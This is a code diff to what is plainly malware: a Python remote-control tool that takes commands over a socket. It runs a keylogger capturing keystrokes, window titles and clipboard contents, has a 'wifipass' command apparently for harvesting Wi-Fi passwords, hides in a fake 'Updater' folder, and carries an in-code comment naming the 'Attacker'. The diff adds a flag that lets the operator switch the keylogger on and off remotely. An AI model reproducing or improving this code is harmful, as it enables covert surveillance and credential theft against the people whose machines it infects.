@@ -92,6 +92,7 @@ something = "something"
 cd_check = 0
 invalid_dir = "Invalid Directory"
 has_ben_defed = 0
+logger_enabled = False
 ###############################
 
 
@@ -220,42 +221,42 @@ def start_keylogger():
                 finish_and_write_info()
 
         def thread_to_start_check_keys():
-            while True:
+            while logger_enabled:
                 time.sleep(.5)
                 check_keys()
 
         def thread_for_window_logger():
-            while True:
+            while logger_enabled:
                 time.sleep(.5)
                 log_window()
 
         def thread_for_clip_logger():
-            while True:
+            while logger_enabled:
                 time.sleep(.5)
                 clipboard_logger()
 
         def listen():
             def on_press(key):
                 global keys_pressed
-
-                try:
-                    if 'Key.' in str(key.char):
-                        sub = str(key.char).split('Key.')[1]
-                        if sub != 'space':
-                            keys_pressed.append(f' [{sub}] ')
+                if logger_enabled:
+                    try:
+                        if 'Key.' in str(key.char):
+                            sub = str(key.char).split('Key.')[1]
+                            if sub != 'space':
+                                keys_pressed.append(f' [{sub}] ')
+                            else:
+                                keys_pressed.append(f' ')
                         else:
-                            keys_pressed.append(f' ')
-                    else:
-                        keys_pressed.append(str(key.char))
-                except AttributeError:
-                    if 'Key.' in str(key):
-                        sub = str(key).split('Key.')[1]
-                        if sub != 'space':
-                            keys_pressed.append(f' [{sub}] ')
+                            keys_pressed.append(str(key.char))
+                    except AttributeError:
+                        if 'Key.' in str(key):
+                            sub = str(key).split('Key.')[1]
+                            if sub != 'space':
+                                keys_pressed.append(f' [{sub}] ')
+                            else:
+                                keys_pressed.append(f' ')
                         else:
-                            keys_pressed.append(f' ')
-                    else:
-                        keys_pressed.append(str(key))
+                            keys_pressed.append(str(key))
             with keyboard.Listener(
                     on_press=on_press) as listener:
                 listener.join()
@@ -339,6 +340,7 @@ def start_keylogger():
 def run_commands():
     global has_ben_defed
     global connection
+    global logger_enabled
     try:
         while True:
             data = connection.recv(1024)
@@ -386,6 +388,7 @@ def run_commands():
                     connection.send(str.encode("exists"))
                 else:
                     connection.send(str.encode("started"))
+                    logger_enabled = True
                     start_keylogger()
             elif ldata == "keylogger get":
                 print("Get command recieved")
@@ -401,6 +404,8 @@ def run_commands():
                     connection.send(str.encode("nan"))
                 else:
                     connection.send(str.encode("ending"))
+                    logger_enabled = False
+                    keyboard.Listener.stop()
                     shutil.rmtree("C:\\Users\\" + getpass.getuser() + "\\Updater", ignore_errors=True)
             elif ldata == "wifipass" or ldata == "wifi pass":
                 pn = 0
@@ -474,6 +479,7 @@ def run_commands():
 
 
 if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
+    logger_enabled = True
     # Attacker has enabled keylogger on this machine before
     threading.Thread(target=start_keylogger).start()
 
